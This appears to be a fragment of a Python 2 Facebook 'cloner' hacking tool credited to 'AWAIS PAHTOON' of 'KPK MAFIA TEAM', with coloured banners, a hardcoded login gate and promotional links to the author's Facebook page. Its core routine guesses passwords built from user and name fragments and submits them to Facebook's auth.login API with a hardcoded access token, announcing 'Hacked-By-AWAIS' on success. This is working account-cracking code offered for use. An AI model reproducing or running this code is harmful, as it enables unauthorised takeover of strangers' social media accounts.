# Zalim #Cloner #Student #Credit black mafia #HACK #!/usr/bin/python2
#coding=utf-8
...
try:
    ...
    time.sleep(1)
    os.system('Then type: python2 zalim')
...
\033[1;96m---------------------AWAIS_PAHTOON---------------------
                

\033[0;95m╭════════════════════════════════════════════╮
\033[0;91m║\033[0;92mAUTHOR : \033[0;92m"AWAIS_KHAN"                                
\033[0;91m║\033[0;91m Team :\033[0;92m "KPK MAFIA TEAM"                                                  
\033[0;91m║ \033[0;93mCredit: \033[0;92m"AWAIS PAHTOON"                                                    
\033[0;95m╰════════════════════════════════════════════╯
...
\033[0;95m╭════════════════════════════════════════════╮
\033[0;91m║\033[0;92mAUTHOR : \033[0;92m"AWAIS KHAN"                                
\033[0;91m║\033[0;91m Team :\033[0;92m "KPK MAFIA TEAM"                                                  
\033[0;91m║ \033[0;93mCredit: \033[0;92m"AWAIS_PAHTOON"                                                    
\033[0;95m╰════════════════════════════════════════════╯
...
logo2 = """
 ...
 \033[1;96m To AWAIS PAHTOON Tool 💜
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
        ...
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:zalim_hacker
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;94mWrong Password"
            os.system('xdg-open https://m.facebook.com/ayanjutt2014')
    else:
...
def action():
    ...
    def main(arg):
        ...
        try:
            ...
            pass
        try:
            pass1 = user + fname + fname123 + fname12345
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print(' Hacked-By-AWAIS  |   User-ID    |   + password'+username)
...
\033[1;95mFb\033[1;97mhttps://w ww.facebook.com/ayanjutt2014"""
